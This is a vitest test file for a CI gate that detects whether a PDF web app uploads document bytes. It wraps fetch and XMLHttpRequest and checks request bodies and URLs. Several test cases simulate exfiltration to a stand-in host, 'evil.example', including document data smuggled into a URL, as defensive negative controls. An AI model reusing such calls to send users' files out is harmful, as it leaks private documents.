import { afterEach, describe, expect, it } from "vitest";
import {
	assertNoUpload,
	containsBytes,
	createFetchRecorder,
	fingerprintsFor,
	inspectBody,
	installRequestRecorder,
} from "./no-upload.js";

const PDF = new TextEncoder().encode("%PDF-1.4 hello document bytes for the no-upload gate");

describe("containsBytes", () => {
	it("finds a contiguous subsequence", () => {
		expect(containsBytes(new Uint8Array([1, 2, 3, 4]), new Uint8Array([2, 3]))).toBe(true);
		expect(containsBytes(new Uint8Array([1, 2, 3]), new Uint8Array([2, 4]))).toBe(false);
		expect(containsBytes(new Uint8Array([1]), new Uint8Array([1, 2]))).toBe(false);
		expect(containsBytes(new Uint8Array([1, 2]), new Uint8Array([]))).toBe(false);
	});
});

describe("assertNoUpload (the WEB.03 CI gate)", () => {
	it("passes when nothing was requested", () => {
		expect(() => assertNoUpload([], [PDF])).not.toThrow();
		expect(() => assertNoUpload([], [])).not.toThrow();
	});

	it("passes for GETs and empty bodies", () => {
		expect(() =>
			assertNoUpload(
				[
					{ url: "https://example.org/r.pdf", method: "GET" },
					{ url: "https://app.selis/ping", method: "POST", body: null },
					{
						url: "https://app.selis/telemetry",
						method: "POST",
						body: JSON.stringify({ name: "session_start", metrics: { pages_shown: 1 } }),
					},
				],
				[PDF],
			),
		).not.toThrow();
	});

	it("fails when a POST body contains the document bytes", () => {
		expect(() =>
			assertNoUpload([{ url: "https://evil.example/upload", method: "POST", body: PDF }], [PDF]),
		).toThrow(/upload detected/);
	});

	it("fails when a POST carries a slice of the document (prefix fingerprint)", () => {
		const slice = PDF.slice(0, 80);
		expect(() =>
			assertNoUpload([{ url: "https://evil.example/x", method: "post", body: slice }], [PDF]),
		).toThrow(/upload detected/);
	});

	it("fails for string bodies embedding the PDF header", () => {
		const text = "%PDF-1.4 hello document bytes for the no-upload gate plus trailing JSON";
		expect(() =>
			assertNoUpload([{ url: "https://evil.example/y", method: "PUT", body: text }], [PDF]),
		).toThrow(/upload detected/);
	});

	it("passes for unrelated binary bodies", () => {
		const other = new Uint8Array([9, 9, 9, 9, 9, 9, 9, 9]);
		expect(() =>
			assertNoUpload([{ url: "https://app.selis/save", method: "POST", body: other }], [PDF]),
		).not.toThrow();
	});

	it("checks every document, not just the first", () => {
		const second = new TextEncoder().encode("%PDF-1.4 second document entirely different");
		expect(() =>
			assertNoUpload(
				[{ url: "https://evil.example/z", method: "POST", body: second }],
				[PDF, second],
			),
		).toThrow(/upload detected/);
	});
});

describe("createFetchRecorder", () => {
	it("records requests for the gate (handoff flow emits no uploads)", () => {
		const recorder = createFetchRecorder();
		// The handoff flow: a range GET (download into the local engine) and
		// an opt-in telemetry ping with no document data.
		recorder.record("https://example.org/r.pdf", "GET");
		recorder.record(
			"https://app.selis/telemetry",
			"POST",
			JSON.stringify({ name: "open", metrics: { pages: 3 } }),
		);
		expect(() => assertNoUpload(recorder.requests, [PDF])).not.toThrow();
		expect(recorder.requests).toHaveLength(2);
	});
});

describe("fingerprintsFor", () => {
	it("cuts the prefix plus spaced windows, so a mid-document slice still matches", () => {
		const doc = new Uint8Array(4096).map((_, index) => (index % 251) as number);
		const windows = fingerprintsFor(doc);
		expect(windows).toHaveLength(16);
		expect(windows.every((window) => containsBytes(doc, window))).toBe(true);
		// The eighth window starts a quarter of the way in: an uploader that
		// ships only that slice (one page, one image stream) is still caught.
		const middle = doc.slice(2016, 2080);
		expect(() =>
			assertNoUpload([{ url: "https://evil.example/x", method: "POST", body: middle }], [doc]),
		).toThrow(/upload detected/);
	});

	it("uses the whole document when it is shorter than one window", () => {
		expect(fingerprintsFor(new Uint8Array([1, 2, 3]))).toHaveLength(1);
		expect(fingerprintsFor(new Uint8Array([]))).toHaveLength(0);
	});
});

describe("assertNoUpload covers the whole request, not just POST bodies", () => {
	it("catches document bytes in a GET body (XHR allows one; fetch does not)", () => {
		expect(() =>
			assertNoUpload([{ url: "https://evil.example/x", method: "GET", body: PDF }], [PDF]),
		).toThrow(/upload detected/);
	});

	it("catches document bytes smuggled into the URL", () => {
		const prefix = String.fromCharCode(...PDF.slice(0, 64));
		expect(() =>
			assertNoUpload([{ url: `https://evil.example/collect?d=${prefix}`, method: "GET" }], [PDF]),
		).toThrow(/upload detected/);
	});

	it("fails closed on a body it cannot read as bytes", () => {
		expect(() =>
			assertNoUpload(
				[{ url: "https://app.selis/x", method: "POST", body: null, uninspectable: true }],
				[PDF],
			),
		).toThrow(/fails closed/);
	});
});

describe("inspectBody", () => {
	it("reads every body shape a request can carry as bytes", async () => {
		const text = await inspectBody("hello");
		expect(text.bytes).toEqual(new TextEncoder().encode("hello"));
		const params = await inspectBody(new URLSearchParams({ a: "1" }));
		expect(params.bytes).toEqual(new TextEncoder().encode("a=1"));
		const buffer = await inspectBody(new Uint8Array([1, 2, 3]).buffer);
		expect(buffer.bytes).toEqual(new Uint8Array([1, 2, 3]));
		const view = await inspectBody(new Uint8Array([9, 1, 2, 3, 9]).subarray(1, 4));
		expect(view.bytes).toEqual(new Uint8Array([1, 2, 3]));
		const blob = await inspectBody(new Blob([PDF]));
		expect(blob.bytes).toEqual(PDF);
	});

	it("reads a multipart FormData body, file and all", async () => {
		const form = new FormData();
		form.set("note", "opened");
		form.set("file", new Blob([PDF], { type: "application/pdf" }), "report.pdf");
		const inspected = await inspectBody(form);
		expect(inspected.uninspectable).toBe(false);
		expect(inspected.bytes).not.toBeNull();
		expect(containsBytes(inspected.bytes ?? new Uint8Array(), PDF)).toBe(true);
	});

	it("marks a stream body uninspectable rather than guessing", async () => {
		const stream = new ReadableStream<Uint8Array>();
		const inspected = await inspectBody(stream);
		expect(inspected).toEqual({ bytes: null, uninspectable: true });
	});

	it("treats a missing body as no body at all", async () => {
		expect(await inspectBody(null)).toEqual({ bytes: null, uninspectable: false });
		expect(await inspectBody(undefined)).toEqual({ bytes: null, uninspectable: false });
	});
});

/** The global surface these tests install and restore around each case. */
interface WritableGlobals {
	fetch?: typeof fetch | undefined;
	XMLHttpRequest?: unknown;
}

/** A stand-in `XMLHttpRequest` that records nothing itself (the recorder does). */
class FakeXhr {
	method = "GET";
	responseURL = "";
	open(method: string, url: string): void {
		this.method = method;
		this.responseURL = url;
	}
	// The double itself is inert: the recorder is what observes the call.
	send(_body?: unknown): void {}
}

/** The unpatched `send`, captured before any recorder wraps it. */
const originalSend = FakeXhr.prototype.send;

const globals = globalThis as unknown as WritableGlobals;
const realFetch = globals.fetch;
const realXhr = globals.XMLHttpRequest;

afterEach(() => {
	globals.fetch = realFetch;
	globals.XMLHttpRequest = realXhr;
});

describe("installRequestRecorder (the DoD gate, live)", () => {
	it("sees a real fetch call and passes it through untouched", async () => {
		const stub = (async () => new Response("ok")) as typeof fetch;
		globals.fetch = stub;
		const recorder = installRequestRecorder();
		const wrapped = globals.fetch;
		const response = await fetch("https://example.org/r.pdf", {
			method: "GET",
			headers: { Range: "bytes=0-1023" },
		});
		expect(await response.text()).toBe("ok");
		const recorded = await recorder.settle();
		expect(recorded).toHaveLength(1);
		expect(recorded[0]?.method).toBe("GET");
		expect(recorded[0]?.url).toBe("https://example.org/r.pdf");
		expect(recorded[0]?.body).toBeNull();
		await expect(recorder.assertNoUpload([PDF])).resolves.toBeUndefined();
		recorder.restore();
		expect(globals.fetch).not.toBe(wrapped);
		expect(globals.fetch).toBe(stub);
	});

	it("catches an upload made through the very fetch it wraps", async () => {
		globals.fetch = (async () => new Response("stored")) as typeof fetch;
		const recorder = installRequestRecorder();
		await fetch("https://evil.example/upload", { method: "POST", body: PDF });
		// The negative control: the gate is live, not vacuous. Without this leg
		// a recorder that never recorded anything would pass every other test.
		await expect(recorder.assertNoUpload([PDF])).rejects.toThrow(/upload detected/);
		recorder.restore();
	});

	it("catches an upload made through XMLHttpRequest.send", async () => {
		globals.XMLHttpRequest = FakeXhr;
		const recorder = installRequestRecorder();
		const xhr = new FakeXhr();
		xhr.open("POST", "https://evil.example/upload");
		xhr.send(PDF);
		const recorded = await recorder.settle();
		expect(recorded).toHaveLength(1);
		expect(recorded[0]?.method).toBe("POST");
		expect(recorded[0]?.url).toBe("https://evil.example/upload");
		await expect(recorder.assertNoUpload([PDF])).rejects.toThrow(/upload detected/);
		recorder.restore();
		expect(FakeXhr.prototype.send).toBe(originalSend);
	});
});
